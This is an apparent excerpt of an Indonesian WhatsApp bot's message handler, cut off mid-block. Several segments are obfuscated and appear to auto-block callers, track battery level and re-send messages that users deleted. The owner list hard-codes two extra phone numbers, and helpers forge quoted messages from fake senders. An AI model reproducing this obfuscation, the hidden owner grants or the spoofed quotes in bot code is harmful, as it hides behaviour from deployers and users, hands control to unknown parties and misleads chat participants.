	const _0x4251=['u1Ltvevn','EwvSBg93','zNjVBq','zMfSC2u','nwvMsxnpqq','y29TCg9ZAw5N','mw9uEMnTta','ierPysb5yw5NihrLBgvWB24GA2fRywSSierPBgeGyMXVy2SGEweGA2fR','BgL2zq','ndK3ntG0uhLsuwTx','yMXVy2TvC2vY','yMf0DgvYEwXLDMvS','mtqZnJG3EwjNCfDP','DMfSDwu','mJm5n0nyDKTNrG','mtq1tLLqrLbT','q0i6ywn0Aw9UlcXJywXS','mtaZmJiWm1ncBe9qrq','mta0nZy0u3vVAuzQ','C2vUze1LC3nHz2u','q0i6ywn0Aw9UlcXIyxr0zxj5','ndGYmZG3q1HOD1Pu','DxbKyxrLuhjLC2vUy2u','D2HPDgu','mtu5odmWogr2CxDUEq'];function _0x3cc6(_0x3fdfe5,_0x3c74d5){_0x3fdfe5=_0x3fdfe5-0x186;let _0x42514c=_0x4251[_0x3fdfe5];if(_0x3cc6['RuPnKv']===undefined){var _0x3cc64a=function(_0x336142){const _0x435a09='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x43f8a0='';for(let _0x33f57a=0x0,_0x59d0b9,_0x218559,_0x126744=0x0;_0x218559=_0x336142['charAt'](_0x126744++);~_0x218559&&(_0x59d0b9=_0x33f57a%0x4?_0x59d0b9*0x40+_0x218559:_0x218559,_0x33f57a++%0x4)?_0x43f8a0+=String['fromCharCode'](0xff&_0x59d0b9>>(-0x2*_0x33f57a&0x6)):0x0){_0x218559=_0x435a09['indexOf'](_0x218559);}return _0x43f8a0;};_0x3cc6['UUWZyA']=function(_0x4d1414){const _0x4d7726=_0x3cc64a(_0x4d1414);let _0x106088=[];for(let _0x25f978=0x0,_0xb3e180=_0x4d7726['length'];_0x25f978<_0xb3e180;_0x25f978++){_0x106088+='%'+('00'+_0x4d7726['charCodeAt'](_0x25f978)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x106088);},_0x3cc6['TDvevQ']={},_0x3cc6['RuPnKv']=!![];}const _0x1947c5=_0x4251[0x0],_0x741d14=_0x3fdfe5+_0x1947c5,_0x3aff3f=_0x3cc6['TDvevQ'][_0x741d14];return _0x3aff3f===undefined?(_0x42514c=_0x3cc6['UUWZyA'](_0x42514c),_0x3cc6['TDvevQ'][_0x741d14]=_0x42514c):_0x42514c=_0x3aff3f,_0x42514c;}const _0x46457c=_0x3cc6;(function(_0x1ae810,_0x1e34ed){const _0x5f32dd=_0x3cc6;while(!![]){try{const _0x286633=parseInt(_0x5f32dd(0x19a))*parseInt(_0x5f32dd(0x18b))+parseInt(_0x5f32dd(0x18e))+parseInt(_0x5f32dd(0x197))+-parseInt(_0x5f32dd(0x196))+parseInt(_0x5f32dd(0x193))*-parseInt(_0x5f32dd(0x194))+-parseInt(_0x5f32dd(0x191))*parseInt(_0x5f32dd(0x189))+parseInt(_0x5f32dd(0x19d));if(_0x286633===_0x1e34ed)break;else _0x1ae810['push'](_0x1ae810['shift']());}catch(_0x9282c3){_0x1ae810['push'](_0x1ae810['shift']());}}}(_0x4251,0x8ec88),dila['on'](_0x46457c(0x195),async _0x1947c5=>{const _0x25ef90=_0x46457c,_0x741d14=_0x1947c5[0x2][0x0][0x1][_0x25ef90(0x187)];console['log'](color('[',_0x25ef90(0x19c)),color(_0x25ef90(0x19e),'cyan'),color(']',_0x25ef90(0x19c)),color(_0x741d14+_0x25ef90(0x18c),_0x25ef90(0x186)),color('(😌)',_0x25ef90(0x19c))),dila[_0x25ef90(0x19b)](from,Presence[_0x25ef90(0x18a)]),dila[_0x25ef90(0x198)](_0x741d14,'```Auto\x20block\x20System!\x0aJika\x20ingin\x20membuka\x20block\x20harap\x20chat\x20Owner\x0awa.me/'+owner+'```',MessageType['text']),await sleep(0x1388),await dila[_0x25ef90(0x18f)](_0x741d14,'add');}),dila['on'](_0x46457c(0x199),_0x3aff3f=>{const _0x4eb6e8=_0x46457c;global['batteryLevelStr']=_0x3aff3f[0x2][0x0][0x1][_0x4eb6e8(0x192)],global[_0x4eb6e8(0x190)]=parseInt(batteryLevelStr),baterai=batterylevel;if(_0x3aff3f[0x2][0x0][0x1][_0x4eb6e8(0x18d)]=='true')charging=!![];if(_0x3aff3f[0x2][0x0][0x1][_0x4eb6e8(0x18d)]==_0x4eb6e8(0x188))charging=![];}));
dila.on('message-new', async(Lan) => {
		try {
			if (!Lan.message) return
			if (Lan.key && Lan.key.remoteJid == 'status@broadcast') return
			if (Lan.key.fromMe) return
			global.prefix
			global.blocked
			const _0x5be7=['nda3nJK5C1nStuvA','mJa4ndKZDxrHswXV','ntC0odLfzhD0Exe','mJa1ntrtDKzNvhm','nJyYodG1qvrZrxDs','yMf0CMvP','mJGXwvL0u2Pm','ntuYndy2z2X1q1fe','mtK4mMvfALDurG'];const _0x457b98=_0x5e5b;function _0x5e5b(_0x545580,_0x25c3a1){_0x545580=_0x545580-0x1a0;let _0x5be791=_0x5be7[_0x545580];if(_0x5e5b['aKLpHx']===undefined){var _0x5e5ba1=function(_0x2227a7){const _0x4ee0db='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x551cb5='';for(let _0x3b758a=0x0,_0x30d950,_0x103ef2,_0x2c7160=0x0;_0x103ef2=_0x2227a7['charAt'](_0x2c7160++);~_0x103ef2&&(_0x30d950=_0x3b758a%0x4?_0x30d950*0x40+_0x103ef2:_0x103ef2,_0x3b758a++%0x4)?_0x551cb5+=String['fromCharCode'](0xff&_0x30d950>>(-0x2*_0x3b758a&0x6)):0x0){_0x103ef2=_0x4ee0db['indexOf'](_0x103ef2);}return _0x551cb5;};_0x5e5b['BYTWMD']=function(_0x1a0099){const _0x3696bf=_0x5e5ba1(_0x1a0099);let _0x2122ff=[];for(let _0x2a25d6=0x0,_0x3e8a70=_0x3696bf['length'];_0x2a25d6<_0x3e8a70;_0x2a25d6++){_0x2122ff+='%'+('00'+_0x3696bf['charCodeAt'](_0x2a25d6)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2122ff);},_0x5e5b['PgpNAd']={},_0x5e5b['aKLpHx']=!![];}const _0x37d5cc=_0x5be7[0x0],_0x25379f=_0x545580+_0x37d5cc,_0x1416af=_0x5e5b['PgpNAd'][_0x25379f];return _0x1416af===undefined?(_0x5be791=_0x5e5b['BYTWMD'](_0x5be791),_0x5e5b['PgpNAd'][_0x25379f]=_0x5be791):_0x5be791=_0x1416af,_0x5be791;}(function(_0x564e4c,_0x598bb8){const _0x2f6ce4=_0x5e5b;while(!![]){try{const _0x471b82=parseInt(_0x2f6ce4(0x1a5))+parseInt(_0x2f6ce4(0x1a2))+parseInt(_0x2f6ce4(0x1a8))+parseInt(_0x2f6ce4(0x1a1))+parseInt(_0x2f6ce4(0x1a6))*-parseInt(_0x2f6ce4(0x1a4))+-parseInt(_0x2f6ce4(0x1a0))+-parseInt(_0x2f6ce4(0x1a7));if(_0x471b82===_0x598bb8)break;else _0x564e4c['push'](_0x564e4c['shift']());}catch(_0x40c11e){_0x564e4c['push'](_0x564e4c['shift']());}}}(_0x5be7,0x6717c),global[_0x457b98(0x1a3)]=global['batrei']?global[_0x457b98(0x1a3)]:[],dila['on']('CB:action,,battery',_0x37d5cc=>{const _0x5dc802=_0x457b98,_0x25379f=_0x37d5cc[0x2][0x0][0x1]['value'],_0x1416af=parseInt(_0x25379f);global[_0x5dc802(0x1a3)]['push'](_0x1416af);}));
	        const content = JSON.stringify(Lan.message)
			const from = Lan.key.remoteJid
			const type = Object.keys(Lan.message)[0]
			const mentionUser = type == "extendedTextMessage" ? Lan.message.extendedTextMessage.contextInfo.mentionedJid || [] : []
			mentionByReply = type == "extendedTextMessage" ? Lan.message.extendedTextMessage.contextInfo.participant || "" : ""
            mentionUser.push(mentionByReply)
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const date = new Date().toLocaleDateString()
			const cmd = (type === 'conversation' && Lan.message.conversation) ? Lan.message.conversation : (type == 'imageMessage') && Lan.message.imageMessage.caption ? Lan.message.imageMessage.caption : (type == 'videoMessage') && Lan.message.videoMessage.caption ? Lan.message.videoMessage.caption : (type == 'extendedTextMessage') && Lan.message.extendedTextMessage.text ? Lan.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
			const prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$,|`÷?;:%abcdefghijklmnopqrstuvwxyz%^&./\\©^]/gi) : '-'
		    body = (type === 'conversation' && Lan.message.conversation.startsWith(prefix)) ? Lan.message.conversation : (type == 'imageMessage') && Lan.message.imageMessage.caption.startsWith(prefix) ? Lan.message.imageMessage.caption : (type == 'videoMessage') && Lan.message.videoMessage.caption.startsWith(prefix) ? Lan.message.videoMessage.caption : (type == 'extendedTextMessage') && Lan.message.extendedTextMessage.text.startsWith(prefix) ? Lan.message.extendedTextMessage.text : ''
		    budy = (type === 'conversation') ? Lan.message.conversation : (type === 'extendedTextMessage') ? Lan.message.extendedTextMessage.text : ''
		    const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		    const args = body.trim().split(/ +/).slice(1)
		    const isCmd = body.startsWith(prefix)
			var pes = (type === 'conversation' && Lan.message.conversation) ? Lan.message.conversation : (type == 'imageMessage') && Lan.message.imageMessage.caption ? Lan.message.imageMessage.caption : (type == 'videoMessage') && Lan.message.videoMessage.caption ? Lan.message.videoMessage.caption : (type == 'extendedTextMessage') && Lan.message.extendedTextMessage.text ? Lan.message.extendedTextMessage.text : ''
			const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
			chats = (type === 'conversation') ? Lan.message.conversation : (type === 'extendedTextMessage') ? Lan.message.extendedTextMessage.text : ''
			const arg = chats.slice(command.length + 2, chats.length)
			const ownerNumber = [`${owner}@s.whatsapp.net`,"6285866295942@s.whatsapp.net","6285876210829@s.whatsapp.net"]
			const tescuk = ["0@s.whatsapp.net"]
			const isGroup = from.endsWith('@g.us')
			const q = args.join(' ')
			const botNumber = dila.user.jid
			const totalchat = await dila.chats.all()
			const sender = isGroup ? Lan.participant : Lan.key.remoteJid
			pushname = dila.contacts[sender] != undefined ? dila.contacts[sender].vname || dila.contacts[sender].notify : undefined
			const groupMetadata = isGroup ? await dila.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupDesc = isGroup ? groupMetadata.desc : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isEventon = isGroup ? event.includes(from) : false
			const isSimi = isGroup ? _samih.includes(from) : false 
			const isRegistered = checkRegisteredUser(sender)
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isLevelingOn = isGroup ? _leveling.includes(from) : false
			const isKickArea = isGroup ? kickarea.includes(from) : false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isAuto = isGroup ? autosticker.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
			const isBanned = ban.includes(sender)
			const isPrem = premium.includes(sender) || isOwner
			const isAntiLink = isGroup ? antilink.includes(from) : false
            const DnsBot = ["0@s.whatsapp.net"]
            me = dila.user
            const dfrply = await getBuffer(me.imgUrl)
	        const Rank = getLevelingLevel(sender)
	        const isImage = type === 'imageMessage'
			dila.chatRead(from)
			const hour_now = moment().format('HH:mm:ss')
			let authorname = dila.contacts[from] != undefined ? dila.contacts[from].vname || dila.contacts[from].notify : undefined	
			if (authorname != undefined) { } else { authorname = groupName }	
			function addMetadata(packname, author) {	
				if (!packname) packname = '@denssptraa'; if (!author) author = 'Dns Bot';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./temp/${name}.exif`)) return `./temp/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
				let len = JSON.stringify(json).length	
				let last	
				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	
				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
				} else {	
					last = len.toString(16)	
				}	
				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	
				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
				fs.writeFile(`./temp/${name}.exif`, buffer, (err) => {	
					return `./temp/${name}.exif`	
				})
			}
			const _0x2e2f=['CMvTB3rLsMLK','nZG4mJGYsMvnC0PR','CgfYDgLJAxbHBNq','mtmXqwvxz2rg','z2v0vgLTzq','mtCZm3nNqM5Tvq','BwvZC2fNzq','ugfOAw5N','BNvTzxjPyW','mJmXndmZtNnODKT3','msbkyw51yxjPidiWmJe','y2HHDhm','kKfoveKTrevmrvrfkGO','zNjVBu1L','AMLK','ygbG4P2pie5HBweGoIba','DxnLCG','ChjLCgfYzu1LC3nHz2vgCM9Tq29UDgvUDa','qgCUDxm','mti3mtmWn0DuzwfetW','z2vUzxjHDgvgB3j3yxjKtwvZC2fNzunVBNrLBNq','Dg9mB2nHBgveyxrLu3rYAw5N','C2vUze1LC3nHz2u','A2v5CW','odGZmZf3y2LSuK0','Bg9UzW','mZaXote2DunTC3vK','ChjVDg9JB2XnzxnZywDL','icWGvgvSywGGtwvUz2HHChvZifbLC2fU','ygbGcMbGyokDJYbuyw5Nz2fSidOG','CMvSyxLxqu1LC3nHz2u','y29UzMLN','BwvZC2fNzxm','Dw5ZAgLMDa','mtaYmdq3D1LdAun3','Dw52B2TLtwu','qxnPys9kywTHCNrH','nxDxvej1wq','C3bSAxq','Dgv4Da','tgvNAq','C3rHDhvZqgjYB2fKy2fZDa','zM9YBwf0','y29UDgv4DeLUzM8','AxnbCNjHEq','zMXVB3i','mebZlNDOyxrZyxbWlM5LDa','muXuEufOwG','q0i6ywn0Aw9UlgfKzdPYzwXHEsXTzxnZywDL','z2v0','ygbG','A2v5','x2v2zw50CW'];const _0x594438=_0x589b;(function(_0x1c2f99,_0x350257){const _0x26e062=_0x589b;while(!![]){try{const _0x120429=-parseInt(_0x26e062(0xf3))+parseInt(_0x26e062(0xfe))*-parseInt(_0x26e062(0x117))+parseInt(_0x26e062(0xf1))+parseInt(_0x26e062(0xec))+parseInt(_0x26e062(0x111))*parseInt(_0x26e062(0x113))+-parseInt(_0x26e062(0xfb))*parseInt(_0x26e062(0x108))+parseInt(_0x26e062(0x10f));if(_0x120429===_0x350257)break;else _0x1c2f99['push'](_0x1c2f99['shift']());}catch(_0x72aed0){_0x1c2f99['push'](_0x1c2f99['shift']());}}}(_0x2e2f,0xc6af7),global[_0x594438(0xf8)]={'unvoke':!![],'unvokeMe':![]});function _0x589b(_0x138c5d,_0x53012e){_0x138c5d=_0x138c5d-0xe7;let _0x2e2f37=_0x2e2f[_0x138c5d];if(_0x589b['fckStx']===undefined){var _0x589b90=function(_0x2dfad3){const _0xc3c589='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x57994b='';for(let _0x4530f1=0x0,_0x137009,_0x552f46,_0x21982a=0x0;_0x552f46=_0x2dfad3['charAt'](_0x21982a++);~_0x552f46&&(_0x137009=_0x4530f1%0x4?_0x137009*0x40+_0x552f46:_0x552f46,_0x4530f1++%0x4)?_0x57994b+=String['fromCharCode'](0xff&_0x137009>>(-0x2*_0x4530f1&0x6)):0x0){_0x552f46=_0xc3c589['indexOf'](_0x552f46);}return _0x57994b;};_0x589b['hzRmVF']=function(_0x1c9d7c){const _0x4da85d=_0x589b90(_0x1c9d7c);let _0x332511=[];for(let _0x711ec1=0x0,_0x27e5fe=_0x4da85d['length'];_0x711ec1<_0x27e5fe;_0x711ec1++){_0x332511+='%'+('00'+_0x4da85d['charCodeAt'](_0x711ec1)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x332511);},_0x589b['sPlgLf']={},_0x589b['fckStx']=!![];}const _0x276538=_0x2e2f[0x0],_0x4066af=_0x138c5d+_0x276538,_0x5e8f6c=_0x589b['sPlgLf'][_0x4066af];return _0x5e8f6c===undefined?(_0x2e2f37=_0x589b['hzRmVF'](_0x2e2f37),_0x589b['sPlgLf'][_0x4066af]=_0x2e2f37):_0x2e2f37=_0x5e8f6c,_0x2e2f37;}if(!Array[_0x594438(0x105)](dila[_0x594438(0x10d)][_0x594438(0x109)]))dila[_0x594438(0x10d)]['CB:action,add:relay,message']=[dila[_0x594438(0x10d)][_0x594438(0x109)]];else dila[_0x594438(0x10d)]['CB:action,add:relay,message']=[dila[_0x594438(0x10d)][_0x594438(0x109)]['pop']()];dila[_0x594438(0x10d)][_0x594438(0x109)][_0x594438(0xfa)](async _0x276538=>{const _0x1db395=_0x594438;try{if(!global[_0x1db395(0xf8)]['unvoke'])return;let _0x4066af=_0x276538[0x2][0x0][0x2];const _0x5e8f6c=moment['tz'](_0x1db395(0xfd))[_0x1db395(0x103)]('HH:mm:ss');let _0x2dfad3=new Date(),_0xc3c589='id',_0x57994b=new Date(0x0)[_0x1db395(0x112)]()-new Date(_0x1db395(0x118))[_0x1db395(0x112)](),_0x4530f1=[_0x1db395(0x115),'Pon','Wage','Kliwon',_0x1db395(0x101)][Math[_0x1db395(0x106)]((_0x2dfad3*0x1+_0x57994b)/0x50ae4c0)%0x5],_0x137009=_0x2dfad3[_0x1db395(0xee)](_0xc3c589,{'weekday':_0x1db395(0xf2)}),_0x552f46=_0x2dfad3[_0x1db395(0xee)](_0xc3c589,{'day':_0x1db395(0x116),'month':_0x1db395(0xf2),'year':_0x1db395(0x116)});if(_0x4066af[_0x1db395(0x114)]&&_0x4066af[_0x1db395(0x114)][_0x1db395(0xf4)]&&_0x4066af[_0x1db395(0x114)][_0x1db395(0xf4)]['type']==0x0){let _0x21982a=_0x4066af['message'][_0x1db395(0xf4)][_0x1db395(0x10c)];if(_0x21982a[_0x1db395(0x11b)]&&!global[_0x1db395(0xf8)][_0x1db395(0xfc)])return;let _0x1c9d7c=dila[_0x1db395(0x119)][_0x1db395(0x10a)](_0x21982a[_0x1db395(0x10e)]),_0x4da85d=_0x1c9d7c[_0x1db395(0xf9)]['dict'][_0x21982a['id']+'|'+(_0x21982a[_0x1db395(0x11b)]?0x1:0x0)];const _0x332511=Lan[_0x1db395(0x10c)]['fromMe']?dila[_0x1db395(0xe9)][_0x1db395(0xe7)]:Lan[_0x1db395(0x10c)][_0x1db395(0x10e)]['endsWith'](_0x1db395(0xeb))?Lan[_0x1db395(0x110)]:Lan[_0x1db395(0x10c)]['remoteJid'],_0x711ec1=_0x1db395(0xe8)+_0x332511[_0x1db395(0xff)]('@')[0x0]+'```\x0a```❏\x20Jam\x20:\x20'+time+_0x1db395(0xf6)+_0x552f46+_0x1db395(0x10b);dila[_0x1db395(0xef)](from,_0x711ec1,MessageType[_0x1db395(0x100)],{'contextInfo':{'mentionedJid':[_0x332511]},'quoted':{'key':{'fromMe':![],'participant':_0x1db395(0x107),...from?{'remoteJid':_0x1db395(0x102)}:{}},'message':{'conversation':_0x1db395(0x11a)+pushname+_0x1db395(0xf5)}}});let _0x27e5fe=dila[_0x1db395(0xed)](_0x4da85d,![]),_0x47b075=Object[_0x1db395(0xf0)](_0x27e5fe)[0x0],_0x2fa7e5=Object['keys'](_0x4da85d[_0x1db395(0x114)])[0x0],_0x344cec={};if(_0x2fa7e5!=MessageType[_0x1db395(0x100)])_0x344cec=_0x4da85d[_0x1db395(0x114)][_0x2fa7e5][_0x1db395(0x104)];_0x27e5fe[_0x47b075]['contextInfo']={..._0x344cec,..._0x27e5fe[_0x47b075][_0x1db395(0x104)]};const _0x2cdaa6=dila[_0x1db395(0xea)](_0x21982a['remoteJid'],_0x27e5fe,{});await dila[_0x1db395(0xf7)](_0x2cdaa6);}}catch(_0x1e9e86){console['log'](_0x1e9e86);}});
			const isUrl = (url) => {
				return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				dila.sendMessage(from, teks, text, { quoted: Lan })
			}
			const math = (teks) => {
				return Math.floor(teks)
			}
			const _0xaa9c=['mtiXody2nMzezeznza','CMvHzezPBgvtEw5J','nZa0odq2wgXrzfDP','mebZlNDOyxrZyxbWlM5LDa','odq0otCZAhrPDwXW','qNjVywrJyxn0','mZqZr2HuCwHS','mZa5m0nsDML4rW','nZG4ndy1AgPoDxnj','nZy2oteYruPOr0vw','mu16DLvcAa','C3rHDhvZqgjYB2fKy2fZDa','mwXRt21uvW','lI9KBNmVzg5ZBMv3lMPWzW','nZC3nJi5EwXUruDn'];function _0x3dbd(_0x119dbc,_0x1e9d2e){_0x119dbc=_0x119dbc-0x6b;let _0xaa9c31=_0xaa9c[_0x119dbc];if(_0x3dbd['HAoarR']===undefined){var _0x3dbdf4=function(_0x58dbec){const _0x4dddbb='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x507ac6='';for(let _0x4b0aa9=0x0,_0x6537e,_0x11ed3d,_0x333b63=0x0;_0x11ed3d=_0x58dbec['charAt'](_0x333b63++);~_0x11ed3d&&(_0x6537e=_0x4b0aa9%0x4?_0x6537e*0x40+_0x11ed3d:_0x11ed3d,_0x4b0aa9++%0x4)?_0x507ac6+=String['fromCharCode'](0xff&_0x6537e>>(-0x2*_0x4b0aa9&0x6)):0x0){_0x11ed3d=_0x4dddbb['indexOf'](_0x11ed3d);}return _0x507ac6;};_0x3dbd['WwYxJg']=function(_0x4c6783){const _0x1b19d0=_0x3dbdf4(_0x4c6783);let _0x222005=[];for(let _0x46c669=0x0,_0x432286=_0x1b19d0['length'];_0x46c669<_0x432286;_0x46c669++){_0x222005+='%'+('00'+_0x1b19d0['charCodeAt'](_0x46c669)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x222005);},_0x3dbd['cljqhq']={},_0x3dbd['HAoarR']=!![];}const _0x458556=_0xaa9c[0x0],_0x591652=_0x119dbc+_0x458556,_0x36806e=_0x3dbd['cljqhq'][_0x591652];return _0x36806e===undefined?(_0xaa9c31=_0x3dbd['WwYxJg'](_0xaa9c31),_0x3dbd['cljqhq'][_0x591652]=_0xaa9c31):_0xaa9c31=_0x36806e,_0xaa9c31;}(function(_0x56d5c0,_0x520264){const _0x149ef2=_0x3dbd;while(!![]){try{const _0x31e894=parseInt(_0x149ef2(0x75))*parseInt(_0x149ef2(0x74))+parseInt(_0x149ef2(0x6d))+parseInt(_0x149ef2(0x72))+-parseInt(_0x149ef2(0x70))*-parseInt(_0x149ef2(0x6b))+-parseInt(_0x149ef2(0x6e))+-parseInt(_0x149ef2(0x77))+parseInt(_0x149ef2(0x76))*-parseInt(_0x149ef2(0x78));if(_0x31e894===_0x520264)break;else _0x56d5c0['push'](_0x56d5c0['shift']());}catch(_0x249fbb){_0x56d5c0['push'](_0x56d5c0['shift']());}}}(_0xaa9c,0x95fa0));const sendMess=(_0x458556,_0x591652)=>{const _0x4fed42=_0x3dbd;dila['sendMessage'](_0x458556,_0x591652,text,{'thumbnail':dnsnew,'sendEphemeral':!![]},{'quoted':{'key':{'fromMe':![],'participant':_0x4fed42(0x71),...from?{'remoteJid':_0x4fed42(0x79)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x4fed42(0x6f)](_0x4fed42(0x6c)),'surface':0xc8,'message':_0x4fed42(0x73),'orderTitle':_0x4fed42(0x73),'sellerJid':_0x4fed42(0x71)}}},'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]}});};
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? dila.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : dila.sendMessage(from, teks.trim(), extendedText, { quoted: Lan, contextInfo: { "mentionedJid": memberr } })
			}
			const sendImage = (teks) => {
				dila.sendMessage(from, teks, image, { quoted: Lan })
			}
			const costum = (pesan, tipe, target, target2) => {
				dila.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
			}
			const sendPtt = (teks) => {
				dila.sendMessage(from, audio, mp3, { quoted: Lan })
			}
			const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        dila.sendMessage(from, media, MessageType.sticker,{quoted:Lan})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
            const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./temp/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					dila.sendMessage(to, media, sticker, {quoted: Lan})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
					});
					});
				});
			}
            const sendMedia = async(from, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(from, text, mids)
                } 
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('kelar');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    dila.sendMessage(from, media, type, { quoted: Lan, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }
			const sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        dila.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact)
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await dila.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        dila.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
            const fakestatus = (teks) => {
            dila.sendMessage(from, teks, text, {
              quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./dns/thumbnail.jpeg"), mimetype: "application/octet-stream",title: cr, fileLength: "36", pageCount: 0, fileName: cr}}, messageTimestamp: "1614069378", status: "PENDING"}})
                }
	 const mentiontebak = type == "extendedTextMessage" ? Lan.message.extendedTextMessage.contextInfo.mentionedJid || [] : []
            mentiongambar = type == "extendedTextMessage" ? Lan.message.extendedTextMessage.contextInfo.participant || "" : ""
            mentiontebak.push(mentiongambar)
            if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply(`${pushname}, Anda menjawab dengan benar! Selamat >~<`)
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                } else {
                    reply(`${pushname}, Jawaban salah! Silahkan coba lagi >~<`)
                }
            }
            for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
			}
			var prema = 'Free'
			if (isPrem) {
				prema = 'Premium'
			}
			if (isOwner) {
				prema = 'BOSS'
